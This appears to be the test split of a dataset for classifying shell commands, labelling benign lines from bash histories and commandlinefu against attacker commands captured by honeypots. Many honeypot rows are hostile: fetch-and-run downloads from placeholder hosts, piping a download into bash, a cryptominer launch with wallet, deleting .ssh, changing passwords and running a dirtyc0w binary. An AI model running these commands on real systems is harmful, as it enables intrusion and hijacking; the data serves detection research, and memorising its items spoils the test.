+d2_002013,rm -rf smecherit.tgz,0,bash_history,test
+d2_002017,add bash/ compton/ i3/ rofi/ .themes/ .vim/ wallpaper/ .Xresources,0,bash_history,test
+d2_002019,cd /bishn/,1,honeypot,test
+d2_002022,download,1,honeypot,test
+d2_002031,git branch -r,0,bash_history,test
+d2_002033,"uptime | awk -F ',' ' {print $1} ' | awk ' {print $3} ' | awk -F ':' ' {hrs=$1; min=$2; print hrs*60 + min} '",0,commandlinefu,test
+d2_002035,"ssh root@pyramid \ ""tcpdump -nn -i eth1 -w -"" | snort -c /etc/snort/snort.conf -r -",0,commandlinefu,test
+d2_002042,"g ci -m ""Ignore build directory""",0,bash_history,test
+d2_002066,git clone git://github.com/sstephenson/rbenv.git .rbenv,0,bash_history,test
+d2_002070,make hello.c,0,bash_history,test
+d2_002074,sh sh,1,honeypot,test
+d2_002076,git diff contents/fractals.tex,0,bash_history,test
+d2_002078,"echo -n ""IP Address or Machine Name: ""; read IP; ping -c 1 -q $IP >/dev/null 2>&1 && echo -e ""\e[00;32mOnline\e[00m"" || echo -e ""\e[00;31mOffline\e[00m""",0,commandlinefu,test
+d2_002079,curl --ntlm -u DOMAIN/user https://he9da8524.example.net/path/to/file,0,commandlinefu,test
+d2_002089,pidof systemd,0,bash_history,test
+d2_002092,./c1RUtovP,1,honeypot,test
+d2_002098,find . -type f | awk -F'.' '{print $NF}' | sort| uniq -c | sort -g,0,commandlinefu,test
+d2_002103,make dependencies,0,bash_history,test
+d2_002110,"xrandr --newmode ""1368x768_60.00"" 85.25 1368 1440 1576 1784 768 771 781 798 -hsync +vsync",0,bash_history,test
+d2_002113,lsmod | grep fat,0,bash_history,test
+d2_002116,git add assets/,0,bash_history,test
+d2_002118,sh 18071.sh,1,honeypot,test
+d2_002122,curl -O http://hfe11f96b.example.net/8UsA.sh,1,honeypot,test
+d2_002131,rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh,1,honeypot,test
+d2_002132,curl http://hb967bfcb.example.net/w.txt -o ygljglkjgfg0,1,honeypot,test
+d2_002135,ls |grep kod,0,bash_history,test
+d2_002139,chmod +x ptUehrfk,1,honeypot,test
+d2_002142,where swift,0,bash_history,test
+d2_002145,vi teste02,0,bash_history,test
+d2_002149,sudo inst cpan,1,honeypot,test
+d2_002152,chef exec rspec spec/unit/recipes/default_spec.rb,0,bash_history,test
+d2_002160,"for file in $(find . -name *.mp4); do ogv=${file%%.mp4}.ogv; if test ""$file"" -nt ""$ogv""; then echo $file' is newer then '$ogv; ffmpeg2theora $file; fi done",0,commandlinefu,test
+d2_002163,./dirtyc0w,1,honeypot,test
+d2_002167,m') ; best = getBestServer(servers) ; if not args.simple: ; print_(('\033[1,1,honeypot,test
+d2_002170,/bin/busybox rm -f /sys/fs/cgroup/freezer/.nippon,1,honeypot,test
+d2_002185,./bjPy7KvD,1,honeypot,test
+d2_002186,diff <(ssh server01 'cd config; find . -type f -exec md5sum {} \;| sort -k 2') <(ssh server02 'cd config;find . -type f -exec md5sum {} \;| sort -k 2'),0,commandlinefu,test
+d2_002191,while :; do ping -W1 -c1 -n 84.166.54.191 > /dev/null || tput bel > /dev/console; sleep 1; done,0,commandlinefu,test
+d2_002197,"emacs --role ""emacs"" --name ""emacs""",0,bash_history,test
+d2_002201,perl kbk,1,honeypot,test
+d2_002202,pw,0,bash_history,test
+d2_002210,""""""" ; fp = kwargs.pop(""file"", sys.stdout) ; if fp is None: ; return ; def write(data): ; if not isinstance(data, basestring): ; data = str(data) ; fp.write(data) ; want_unicode = False ; sep = kwargs.pop(""sep"", None) ; if sep is not None: ; if isinstance(sep, unicode): ; want_unicode = True ; elif not isinstance(sep, str): ; raise TypeError(""sep must be None or a string"") ; end = kwargs.pop(""end"", None) ; if end is not None: ; if isinstance(end, unicode): ; want_unicode = True ; elif not isinstance(end, str): ; raise TypeError(""end must be None or a string"") ; if kwargs: ; raise TypeError(""invalid keyword arguments to print()"") ; if not want_unicode: ; for arg in args: ; if isinstance(arg, unicode): ; want_unicode = True ; break ; if want_unicode: ; newline = unicode(""\n"") ; space = unicode("" "") ; else: ; newline = ""\n"" ; space = "" "" ; if sep is None: ; sep = space ; if end is None: ; end = newline ; for i, arg in enumerate(args): ; if i: ; write(sep) ; write(arg) ; write(end) ; else: ; print_ = getattr(builtins, 'print') ; del builtins ; class SpeedtestCliServerListError(Exception): ; """"""Internal Exception class used to indicate to move on to the next",1,honeypot,test
+d2_002211,man lpoptions,0,bash_history,test
+d2_002233,bash -x script.sh 2> log,0,commandlinefu,test
+d2_002235,sudo showkey -k,0,commandlinefu,test
+d2_002238,xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 xinput test,0,commandlinefu,test
+d2_002240,"mycommand 2> >(while read line; do echo -e ""\e[01;31m$line\e[0m""; done)",0,commandlinefu,test
+d2_002242,dig slashdot.org,0,bash_history,test
+d2_002245,sudo mv -R deurbel /etc/services/deurbel,0,bash_history,test
+d2_002246,sudo mv *9560* ~/boot_backup/,0,bash_history,test
+d2_002252,z0rmsh0gu,1,honeypot,test
+d2_002260,vim .ICEauthority,0,bash_history,test
+d2_002267,LC_ALL=C ss -tln,1,honeypot,test
+d2_002276,mv fullcompile,0,bash_history,test
+d2_002279,nano gmail.php,0,bash_history,test
+d2_002284,docker rmi rsyslog/syslog_appliance_alpine,0,bash_history,test
+d2_002291,// Replace abi-tasks-dev and abi-tasks-prod with,0,bash_history,test
+d2_002295,QWEdsa1@#,1,honeypot,test
+d2_002296,vi casegoodmorning.sh,0,bash_history,test
+d2_002308,./J9zQyPPX,1,honeypot,test
+d2_002313,./x86 Servers,1,honeypot,test
+d2_002314,"cut -d"","" -f9",0,commandlinefu,test
+d2_002315,./G66URQK2,1,honeypot,test
+d2_002322,m]\033[1,1,honeypot,test
+d2_002332,mplayer vokoscreen-2017-04-26_23-12-29_edit_8_7_Call_To_Action_Buttons.mp4,0,bash_history,test
+d2_002333,./usgBrsDs,1,honeypot,test
+d2_002334,cat part1.avi part2.avi part3.avi > tmp.avi && mencoder -forceidx -oac copy -ovc copy tmp.avi -o output.avi && rm -f tmp.avi,0,commandlinefu,test
+d2_002337,ssh bos-lvthz.bos01.kendall.corp.akamai.com,0,bash_history,test
+d2_002340,pacman -S kdebase-konsole,0,bash_history,test
+d2_002352,more selftyperedeclared.test,0,bash_history,test
+d2_002353,feh --bg-fill ~/Pictures/Wallpapers/alchemical_wbb.jpg,0,bash_history,test
+d2_002356,./k1337.x86,1,honeypot,test
+d2_002361,rr .gitignore,0,bash_history,test
+d2_002370,lwp-download http://h7642432e.example.net/2start.jpg /tmp/2start.jpg,1,honeypot,test
+d2_002382,man cbq,0,bash_history,test
+d2_002386,cat -n diretorio,0,bash_history,test
+d2_002387,uberwriter,0,bash_history,test
+d2_002391,tar zxvf udp.tgz,0,bash_history,test
+d2_002397,sudo passwd ubuntu,0,bash_history,test
+d2_002398,bundle exec rails c,0,bash_history,test
+d2_002400,tar xvf ha.tgz,0,bash_history,test
+d2_002402,say WORD,0,commandlinefu,test
+d2_002405,ls .cu,0,bash_history,test
+d2_002414,rm -rf /.ssh,1,honeypot,test
+d2_002418,ll -h PG0002526-DNA_fastq/,0,bash_history,test
+d2_002426,./Mycroft-QtApplication-x86_64.AppImage,0,bash_history,test
+d2_002430,wget http://h933e1e39.example.net/Senpai.sh,1,honeypot,test
+d2_002449,wgets.com/sites/default/files/download/SW/V2.1.0/WebGrabPlus_V2.1_install.tar.gz,0,bash_history,test
+d2_002452,iconv -f utf8 -t ascii//TRANSLIT <output-file>,0,commandlinefu,test
+d2_002453,git clones.top/mekong/WA-Vetlink.git .,0,bash_history,test
+d2_002457,./a21jj,1,honeypot,test
+d2_002460,- name: mongo-container,0,bash_history,test
+d2_002461,vim index.php,0,bash_history,test
+d2_002466,"tar -czvvf backup$(date ""+%Y%m%d_%H%M%S"").tar.gz /path/to/dir",0,commandlinefu,test
+d2_002471,w3m localhost,0,bash_history,test
+d2_002475,rm Image,0,bash_history,test
+d2_002479,LC_ALL=C /home/admin/.dhpcd -o 76.132.177.92:4444 -t4 --safe -B >/dev/null 2>/dev/null,1,honeypot,test
+d2_002480,make [target] VAR=foobar,0,commandlinefu,test
+d2_002484,./configure --prefix=/opt/cross,0,bash_history,test
+d2_002488,python3 test_Publish.py 111 222,0,bash_history,test
+d2_002501,ls -kl,0,bash_history,test
+d2_002507,ls ~/.local/lib/python2.7/site-packages/,0,bash_history,test
+d2_002517,curlsercontent.com/aurora/rmate/master/rmate > rmate,0,bash_history,test
+d2_002519,apt-get install tomcat7-docs tomcat7-admin tomcat7-examples,0,bash_history,test
+d2_002525,"while [ 1 ]; do banner 'ze missiles, zey are coming! ' | while IFS=""\n"" read l; do echo ""$l""; sleep 0.01; done; done",0,commandlinefu,test
+d2_002533,sudo nano /edx/app/edxapp/edx-platform/conf/locale/ar/,0,bash_history,test
+d2_002534,tail debug.log,0,bash_history,test
+d2_002538,sudo systemctl start vmware-networks.service,0,bash_history,test
+d2_002539,ls --color,0,bash_history,test
+d2_002553,vim /usr/src/linux/,0,bash_history,test
+d2_002557,service xinetd stop,0,bash_history,test
+d2_002559,vim .ssh/id_rsa.pub,0,bash_history,test
+d2_002562,LC_ALL=C rm -f /dev/shm/029jwwvfan02qmytjo22l7blv7,1,honeypot,test
+d2_002573,sudo modprobe rtsx_pci_ms,0,bash_history,test
+d2_002582,"git commit -m ""first commit""testproj",0,bash_history,test
+d2_002592,./cnrig -o 68.198.238.17:5555 -u (44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A) -p victor+dihef44682@link3mail.com -t,1,honeypot,test
+d2_002593,wget -q http://h03013622.example.net/servicesd000/fx19.x86,1,honeypot,test
+d2_002594,IFS=:; find $PATH | grep pattern,0,commandlinefu,test
+d2_002601,/bin/busybox cat /sys/fs/cgroup/freezer/.nippon,1,honeypot,test
+d2_002605,./FrqD6cQm,1,honeypot,test
+d2_002608,ssh -o 'StrictHostKeyChecking no' root@59.105.229.242,0,bash_history,test
+d2_002623,find /home/dir -mtime +1 -print -exec gzip -9 {} \; -exec mv {}.gz {}_`date +%F`.gz \;,0,commandlinefu,test
+d2_002629,zxi,0,bash_history,test
+d2_002633,"find . -name ""whatever.*"" -print0 | rsync -av --files-from=- --from0 ./ ./destination/",0,commandlinefu,test
+d2_002636,watch -n60 --kill -USR1 $(pgrep dd),0,commandlinefu,test
+d2_002638,dpkg --get-selections | grep linux-image,0,commandlinefu,test
+d2_002644,gcc test.c -o test,0,bash_history,test
+d2_002647,ruler() { for s in '....^....|' '1234567890'; do w=${#s}; str=$( for (( i=1; $i<=$(( ($COLUMNS + $w) / $w )) ; i=$i+1 )); do echo -n $s; done ); str=$(echo $str | cut -c -$COLUMNS) ; echo $str; done; },0,commandlinefu,test
+d2_002650,ls /var/log -all,0,bash_history,test
+d2_002653,"services() { printf ""$(service --status-all 2>&1|sed -e 's/\[ + \]/\\E\[42m\[ + \]\\E\[0m/g' -e 's/\[ - \]/\\E\[41m\[ - \]\\E\[0m/g' -e 's/\[ ? \]/\\E\[43m\[ ? \]\\E\[0m/g')\n"";}",0,commandlinefu,test
+d2_002656,cd go,1,honeypot,test
+d2_002659,for i in `openstack baremetal node list -c UUID -f value`; do ironic node-update $i ; done,0,bash_history,test
+d2_002663,./O7XgKaIK,1,honeypot,test
+d2_002668,find . -name <pattern> -ls | awk 'BEGIN {i=0}; {i=i+$7}; END {print i}',0,commandlinefu,test
+d2_002676,bashmount,0,bash_history,test
+d2_002689,mplayer -vo null something.mpg,0,commandlinefu,test
+d2_002695,cta,0,bash_history,test
+d2_002696,sudo deluser bwhite humanresources,0,bash_history,test
+d2_002698,omni- configure,0,bash_history,test
+d2_002699,cat /tmp/sixnet_status.,0,bash_history,test
+d2_002700,sys password 0fj8Hx6W4yH,1,honeypot,test
+d2_002708,/var/log/syslog,0,bash_history,test
+d2_002711,nano mosquitto.conf.gz,0,bash_history,test
+d2_002715,"du -hS / | perl -ne '(m/\d{3,}M\s+\S/ || m/G\s+\S/) && print'",0,commandlinefu,test
+d2_002728,vim zenburn,0,bash_history,test
+d2_002735,pip install pyLast,0,bash_history,test
+d2_002744,echo 'foo' | tee >(wc -c) >(grep o) >(grep f),0,commandlinefu,test
+d2_002746,sudo apt-get remove --purge resolvconf,0,bash_history,test
+d2_002750,ls -ltr ~/.virtualenvs/,0,bash_history,test
+d2_002759,chmod +x arquivobin,0,bash_history,test
+d2_002762,cp /etc/wgetrc /top/,0,bash_history,test
+d2_002767,rm -rf upp,1,honeypot,test
+d2_002774,strace passwd 2>a,0,bash_history,test
+d2_002787,yaourt cardano,0,bash_history,test
+d2_002788,sudo git add ../tools/,0,bash_history,test
+d2_002790,maestro,0,bash_history,test
+d2_002806,"ps -eorss,args | sort -nr | pr -TW$COLUMNS | head",0,commandlinefu,test
+d2_002813,rm pdf.js,0,bash_history,test
+d2_002817,python -m pip --version,0,bash_history,test
+d2_002820,rpm -qa wget,0,bash_history,test
+d2_002821,systemctl start firewalld,0,bash_history,test
+d2_002823,/etc/xinetd.d/,0,bash_history,test
+d2_002825,wget `lynx -dump http://h9ea06f54.example.net/ebowtube.php | grep .flv$ | sed 's/[[:blank:]]\+[[:digit:]]\+\. //g'`,0,commandlinefu,test
+d2_002828,openssl --version,0,bash_history,test
+d2_002830,wget http://h0e6255f0.example.net/Pemex.sh,1,honeypot,test
+d2_002832,ls system-tools-backends/,0,bash_history,test
+d2_002834,"echo ""${WHI}# ${DRED}Ram ${DRED} -> ${WHI}${ram}MB [1024MB = 1GB]"" #${WHI}"" ; echo ""${WHI}# ${DRED}GPU ${DRED} -> ${WHI}${vid}"" ; echo ""${WHI}# ${DRED}DISK SPACE ${DRED} -> ${WHI}${DISK}"" ; echo ""${WHI}# ${DRED}Versiune ${DRED} -> ${WHI}${VER}"" ; echo ""${WHI}# ${DRED}Uptime ${DRED} -> ${WHI}${zile} Zile"" ; sleep 2 ; if ((${EUID:-0} || ""$(id -u)"")) ; then ; echo ""${WHI}#${DRED} Drept de root -> ${WHI}Nu ai""""${WHI} ${WHI}"" ; sleep 3 ; else ; echo ""${WHI}# ${DRED}Drept de root -> ${WHI}Ai ${WHI}"" ; fi ; sleep 3 ; echo ""${DRED}--------------------------------------------------------------------------${WHI}"" ; echo ""${WHI} | ${WHI}SPEED TESTUL INCEPE IN 3 SECUNDE | ${WHI}"" ; echo ""${DRED}--------------------------------------------------------------------------${WHI}"" ; sleep 1 ; echo ""${DRED} ->${WHI}1${WHI}"" ; sleep 1 ; echo ""${DRED} ->${WHI}2${WHI}"" ; sleep 1 ; echo ""${DRED} ->${WHI}3${WHI}"" ; sleep 1 ; wget nasapaul.com/v.py ; perl v.py y ; perl ninfo ; nano v.py ; #!/usr/bin/env python ; # -*- coding: utf-8 -*- ; # Copyright 2012-2017 Matt Martz ; # All Rights Reserved. ; # ; # Licensed under the Apache License, Version 2.0 (the ""License"") ; you may ; # not use this file except in compliance with the License. You may obtain ; # a copy of the License at ; # ; # http://hf44de385.example.net/licenses/LICENSE-2.0 ; # ; # Unless required by applicable law or agreed to in writing, software ; # distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT ; # WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the ; # License for the specific language governing permissions and limitations ; # under the License. ; # ; # ; # ; import os ; import re ; import sys ; import math ; import signal ; import socket ; import timeit ; import platform ; import threading ; __version__ = '0.3.4' ; # Some global variables we use ; user_agent = None ; source = None ; shutdown_event = None ; scheme = 'http' ; # Used for bound_interface ; socket_socket = socket.socket ; try: ; import xml.etree.cElementTree as ET ; except ImportError: ; try: ; import xml.etree.ElementTree as ET ; except ImportError: ; from xml.dom import minidom as DOM ; ET = None ; # Begin import game to handle Python 2 and Python 3 ; try: ; from urllib2 import urlopen, Request, HTTPError, URLError ; except ImportError: ; from urllib.request import urlopen, Request, HTTPError, URLError ; try: ; from httplib import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py2 = sys.exc_info() ; try: ; from http.client import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py3 = sys.exc_info() ; raise SystemExit('Your python installation is missing required HTTP ' ; 'client classes:\n\n' ; 'Python 2: %s\n' ; 'Python 3: %s' % (e_http_py2[1], e_http_py3[1])) ; try: ; from Queue import Queue ; except ImportError: ; from queue import Queue ; try: ; from urlparse import urlparse ; except ImportError: ; from urllib.parse import urlparse ; try: ; from urlparse import parse_qs ; except ImportError: ; try: ; from urllib.parse import parse_qs ; except ImportError: ; from cgi import parse_qs ; try: ; from hashlib import md5 ; except ImportError: ; from md5 import md5 ; try: ; from argparse import ArgumentParser as ArgParser ; except ImportError: ; from optparse import OptionParser as ArgParser ; try: ; import builtins ; except ImportError: ; def print_(*args, **kwargs): ; """"""The new-style print function taken from",1,honeypot,test
+d2_002836,rosrun perception_training track_reporter --experiment_id mgguanjian-TOHS-test_tasks_max_distance20-config0-cloud --output_path mgguanjian-TOHS-test_tasks_max_distance20-config0-cloud.2018.6.15.html,0,bash_history,test
+d2_002840,/bin/busybox echo -e '\x47\x72\x6f\x70/sys/fs/cgroup' > /sys/fs/cgroup/.nippon,1,honeypot,test
+d2_002844,apg -a 0 -n 10,0,commandlinefu,test
+d2_002851,gpio -g mode pwm 33,0,bash_history,test
+d2_002854,vi update,0,bash_history,test
+d2_002858,kmi-client-check sqa2 -r release-pulsar-9590-2017-04-24-19-35 -,0,bash_history,test
+d2_002866,ehad jellyfish.kmers.fa,0,bash_history,test
+d2_002868,man ftp,0,bash_history,test
+d2_002878,git add --all storage/modification/,0,bash_history,test
+d2_002894,rm -rf max.*,1,honeypot,test
+d2_002905,sudo dnf install bspwm sxhkd,0,bash_history,test
+d2_002911,"echo ""zeroshell"" | rm -R /var/libxml_CP",1,honeypot,test
+d2_002915,which uptime,1,honeypot,test
+d2_002918,nano .htaccess,0,bash_history,test
+d2_002924,sudo pip3 install -r requirement.txt,0,bash_history,test
+d2_002935,kill -9 13165 14773 32627,0,bash_history,test
+d2_002941,rm concatAxoFastqFilesSingleOneLane.sh,0,bash_history,test
+d2_002945,ls ../,0,bash_history,test
+d2_002956,sed 's/^M$//' input.txt > output.txt,0,commandlinefu,test
+d2_002963,yum install passlib,0,bash_history,test
+d2_002966,iostat -d -x 10 5,0,commandlinefu,test
+d2_002967,chmod +x diretorio,0,bash_history,test
+d2_002970,cat teste | uniq -i,0,bash_history,test
+d2_002972,systemctl enable sxhkd.service,0,bash_history,test
+d2_002973,ore=$(( uptime/60/60%24 )),1,honeypot,test
+d2_002977,grep bash /etc/passwd,1,honeypot,test
+d2_002979,ps aux|grep syslo,0,bash_history,test
+d2_002985,(echo sHIJGkC5aXEqqOl,1,honeypot,test
+d2_002986,run ls.sh /home,0,bash_history,test
+d2_002996,kill w3m,0,bash_history,test
+d2_002997,"alias rot13=""tr a-zA-Z n-za-mN-ZA-M""",0,commandlinefu,test
+d2_003000,git add admin/controller/extension/export_import.php,0,bash_history,test
+d2_003003,vim block.h,0,bash_history,test
+d2_003006,( zcat $FILE || gzcat $FILE || bzcat2 $FILE ) | less,0,commandlinefu,test
+d2_003013,service puppetagent status,0,bash_history,test
+d2_003014,"uuencode archive.tar.gz archive.tar.gz | mail -s ""Emailing: archive.tar.gz"" user@example.com",0,commandlinefu,test
+d2_003015,deluser bwhite contractors,0,bash_history,test
+d2_003018,rm -rf coursebuilder_resources_1_11_x/,0,bash_history,test
+d2_003019,sudo -H vim /etc/default/grub,0,bash_history,test
+d2_003023,"echo boo{,,,,,,,,,,}",0,commandlinefu,test
+d2_003028,git ls-tree --name-only,0,bash_history,test
+d2_003033,utmpdump /var/log/wtmp,0,commandlinefu,test
+d2_003037,LC_ALL=C crontab -l,1,honeypot,test
+d2_003039,pkg install python,0,bash_history,test
+d2_003047,rem workspaces,0,bash_history,test
+d2_003049,./rU3RsTth,1,honeypot,test
+d2_003050,sudo apt install -y lynx,0,bash_history,test
+d2_003052,netstat -nltp,0,bash_history,test
+d2_003053,grep -v $'[^\t\r -~]' my-file-with-non-ascii-characters,0,commandlinefu,test
+d2_003060,sudo apt-get install docker-ce=18.03.0~ce-0~ubuntu,0,bash_history,test
+d2_003064,./ntpd,1,honeypot,test
+d2_003066,cat broadcom/epc4911/gw_scripts/iproute2/rt_tables,0,bash_history,test
+d2_003067,rm -rf bash.tgz,1,honeypot,test
+d2_003068,g++ hello.cpp,0,bash_history,test
+d2_003078,cd /var/tmo,1,honeypot,test
+d2_003079,curl -fsSL http://ha1e67547.example.net/2start.jpg | bash -sh,1,honeypot,test
+d2_003081,/bin/busybox echo -e '\x47\x72\x6f\x70/sys/fs/cgroup/freezer' > /sys/fs/cgroup/freezer/.nippon,1,honeypot,test
+d2_003085,l. The\ Cardigans\ -\ Gran\ Turismo\ \(1998\)\[CBR-320\]/,0,bash_history,test
+d2_003094,mythtv --status,0,bash_history,test
+d2_003102,vim /etc/i3/config,0,bash_history,test
+d2_003115,vi Playbooks/playbook1.yml,0,bash_history,test
+d2_003116,alsi -s 'screenshot.png',0,bash_history,test
+d2_003118,ls .bazaar/,0,bash_history,test
+d2_003119,vi you.sh,0,bash_history,test
+d2_003132,perl .mm,1,honeypot,test
+d2_003134,cat trinity_test/nohup.out,0,bash_history,test
+d2_003148,mkdir .z,1,honeypot,test
+d2_003151,sudo vi /etc/profile,0,bash_history,test
+d2_003153,rm -rf .bot,0,bash_history,test
+d2_003155,perl perl-Time-HiRes-1.9760-439.fc31.x86_64.rpm,1,honeypot,test
+d2_003156,sudo mv /usr/lib/purple-2/libyahoo-plusplus.so /tmp/,0,bash_history,test
+d2_003161,"wget -r -P ./dl/ -A jpg,jpeg http://h71ba300d.example.net",0,commandlinefu,test
+d2_003169,"git branch -r | awk -F'/' '{print ""git fetch ""$1,$2}' | xargs -I {} sh -c {}",0,commandlinefu,test
+d2_003172,rm -rf dxpol-5.1.tgz,1,honeypot,test
+d2_003176,mkdir .themes,0,bash_history,test
+d2_003179,echo 'c84fa6b830e38ee8a551df61172d53d7 myfile' | md5sum -c,0,commandlinefu,test
+d2_003180,du -s * | sort -n | tail,0,commandlinefu,test
+d2_003188,checkrestart,0,commandlinefu,test
+d2_003193,sudo netstat -punta,0,commandlinefu,test
+d2_003194,cp kp1.txt kp2.txt,0,bash_history,test
+d2_003199,tar -xzvf oznminerv2x,1,honeypot,test
+d2_003200,cp /home/group/.git/ /home/silar/.git,0,bash_history,test
+d2_003206,tar c folder_to_encrypt | openssl enc -aes-256-cbc -e > secret.tar.enc,0,commandlinefu,test
+d2_003208,ip_subnet: '188.115.1.173/24',0,bash_history,test
+d2_003209,wget http://hdedcf99e.example.net/eBxUk/kjUiwa2.sh,1,honeypot,test
+d2_003212,apt-get install zamp,1,honeypot,test
+d2_003213,for f in *php; do echo $f >> ~/temp/errors.txt; phpcsw $f | grep GET >> ~/temp/errors.txt; done,0,commandlinefu,test
+d2_003215,./sh,1,honeypot,test
+d2_003223,perl zyk >>/dev/null,1,honeypot,test
+d2_003224,mv test.sh aula_06-03-2012.sh,0,bash_history,test
+d2_003228,vim read-boundary.c,0,bash_history,test
+d2_003230,man shutdown,0,bash_history,test
+d2_003239,"grep -i ""$(date +%b"" ""%d )13:4[0-5]"" syslog",0,commandlinefu,test
+d2_003250,./vo4Ps1NH,1,honeypot,test
+d2_003256,"yt () mplayer -fs -quiet $(youtube-dl -g ""$1"")",0,commandlinefu,test
+d2_003264,/bin/busybox echo -e '\x50\x6f\x72\x74/dev/shm' > /dev/shm/.none,1,honeypot,test
+d2_003269,"find -wholename ""*/query/*.json""",0,commandlinefu,test
+d2_003270,grep -x arquivotrabalho3,0,bash_history,test
+d2_003284,gpg --keyserver hkp://keys.gnupg.net --rec-keys d39dc0e3,0,bash_history,test
+d2_003291,man compton,0,bash_history,test
+d2_003292,cat count.txt | awk '{ sum+=$1} END {print sum}',0,commandlinefu,test
+d2_003296,"find . -type f -name ""*~"" -exec rm {} \;",0,bash_history,test
+d2_003304,nohup /root/cong &gt,1,honeypot,test
+d2_003311,mv /root/git-1.8.2.tar.gz .,0,bash_history,test
+d2_003312,vagrant halt,0,bash_history,test
+d2_003314,brew install wget,0,bash_history,test
+d2_003319,pip install --upgrade psycopg2-binary,0,bash_history,test
+d2_003334,bin/kafka-server-start.sh config/server.properties &,0,bash_history,test
+d2_003335,tar xf serv.tar.gz,1,honeypot,test
+d2_003337,sh add_num.sh 10,0,bash_history,test
+d2_003343,cpu cpu0,0,bash_history,test
+d2_003347,sudo mkdir bin,0,bash_history,test
+d2_003349,"tail -f /var/log/messages | while read line; do accu=""$line""; while read -t 1 more; do accu=`echo -e ""$accu\n$more""`; done; notify-send ""Syslog"" ""$accu""; done",0,commandlinefu,test
+d2_003350,vim ad.yml,0,bash_history,test
+d2_003351,ls sec2,0,bash_history,test
+d2_003360,find -name .git -prune -o -type f -exec md5sum {} \; | sort -k2 | md5sum,0,commandlinefu,test
+d2_003363,cat teste.case.sh,0,bash_history,test
+d2_003373,^passwd,1,honeypot,test
+d2_003376,echo s1vLE0t8CFc2UyYv) | passwd,1,honeypot,test
+d2_003377,OS::TripleO::Compute::Ports::TenantPort: /usr/share/openstack-tripleo-heat-templates/network/ports/tenant_from_pool.yaml,0,bash_history,test
+d2_003380,bash: hhneuauf.de]$: command not found,0,bash_history,test
+d2_003388,rm -rf .borwind,0,bash_history,test
+d2_003389,"sudo apt-get remove $(dpkg -l|awk '/^ii linux-image-/{print $2}'|sed 's/linux-image-//'|awk -v v=`uname -r` 'v>$0'|sed 's/-generic*//'|awk '{printf(""linux-headers-%s\nlinux-headers-%s-generic*\nlinux-image-%s-generic*\n"",$0,$0,$0)}')",0,commandlinefu,test
+d2_003394,sh antibinsbins.sh,1,honeypot,test
+d2_003401,"echo 'hardstatus alwayslastline "" %d-%m-%y %c:%s | %w""' >> $HOME/.screenrc; screen",0,commandlinefu,test
+d2_003407,m') ; print_('\033[1,1,honeypot,test
+d2_003411,tail -f <filename> | grep -C <# of lines to show above and below> <text>,0,commandlinefu,test
+d2_003416,feh -F .wallpaper/,0,bash_history,test
+d2_003419,chgrp -R www-data bootstrap/cache,0,bash_history,test
+d2_003427,git flech,0,bash_history,test
+d2_003430,rpm2cpio package.rpm |cpio -dimv,0,commandlinefu,test
+d2_003443,sudo !-1,0,commandlinefu,test
+d2_003444,grep: ./ccsp/CcspCommonLib/source/debug_api/include/.#ccsp_trace.h: No such file or directory,0,bash_history,test
+d2_003456,echo linux|rev,0,commandlinefu,test
+d2_003466,busybox sh kjUiwa2.sh,1,honeypot,test
+d2_003474,"echo -e ""qweasd123\n5xMGcAmmjORl\n5xMGcAmmjORl"" | passwd | bash",1,honeypot,test
+d2_003476,python3 -m LittlePigHoHo.manage createsuperuser,0,bash_history,test
+d2_003499,less upnpserver.xml,0,bash_history,test
+d2_003501,ll],0,bash_history,test
+d2_003502,rm -rf Corona.x86_64,1,honeypot,test
+d2_003504,convert sample.pdf sample.jpg,0,commandlinefu,test
+d2_003507,ls /etc/httpd/run/htcacheclean/,0,bash_history,test
+d2_003511,be rails g migration AddAuthorIdToMiracles author_id:integer,0,bash_history,test
+d2_003529,"fgrep -rnw . -e ""text""",0,bash_history,test
+d2_003554,scp -r /YOURLS-1.7 olumide@mide.co:/html/url,0,bash_history,test
+d2_003557,/bin/busybox cat /dev/pts/.nippon,1,honeypot,test
+d2_003563,cat /proc/acpi/ac_adapter/AC0/state,0,commandlinefu,test
+d2_003578,"curl -O -L -O -C - http://h95966ad7.example.net/go.tgz --header ""Host: www.btcsavetheworld.org""",1,honeypot,test
+d2_003580,vim intermediate/certs/ca-chain.cert.pem,0,bash_history,test
+d2_003582,"ls -1 /bin | xargs -l1 whatis 2>/dev/null | grep -v ""nothing appropriate""",0,commandlinefu,test
+d2_003584,tar -czvf testlink-1.9.17.tar /home/admin/web/testlink.digiprojects.top/public_html/*,0,bash_history,test
+d2_003585,LC_ALL=C /var/tmp/otwl27g526o32e1fvwd0p98uia,1,honeypot,test
+d2_003588,sudo pacman -Ss qt5-base,0,bash_history,test
+d2_003592,sh Tadaa2.sh,1,honeypot,test
+d2_003595,be rake,0,bash_history,test
+d2_003596,sudo passwd -dl root,1,honeypot,test
+d2_003598,"curl -u USER:PASS -d status=""NEW STATUS"" http://hd5cb51de.example.net/api/statuses/update.xml",0,commandlinefu,test
+d2_003603,"xprop | awk '/PID/ {print $3}' | xargs ps h -o pid,cmd",0,commandlinefu,test
+d2_003606,sudo chown apache:apche member_picture/,0,bash_history,test
+d2_003618,sudo pm-hibernate,0,commandlinefu,test
+d2_003620,for file in <directory A>/*; do rm <directory B>/`basename $file`; done,0,commandlinefu,test
+d2_003622,./mysemant_b grading/dispatch.test > out,0,bash_history,test
+d2_003630,ls /Library/StartupItems/,0,bash_history,test
+d2_003631,sudo gedit helloworld.cpp,0,bash_history,test
+d2_003635,sudo apt install bonjour,0,bash_history,test
+d2_003642,This function automatically adds a User-Agent header to all requests,1,honeypot,test
+d2_003648,shred -u -z -n 17 rubricasegreta.txt,0,commandlinefu,test
+d2_003652,/bin/busybox chmod +x x86_64,1,honeypot,test
+d2_003656,cp -a ~/Downloads/git.emacs.d/ac-dict ~/.emacs.d/,0,bash_history,test
+d2_003663,"g, endpoint_bridge)",0,bash_history,test
+d2_003673,vi page.twig.php,0,bash_history,test
+d2_003675,IPYTHON,0,bash_history,test
+d2_003676,la Flowpack.FusionBP/,0,bash_history,test
+d2_003677,LD_TRACE_LOADED_OBJECTS=1 name_of_executable,0,commandlinefu,test
+d2_003687,python dns.py -h,0,bash_history,test
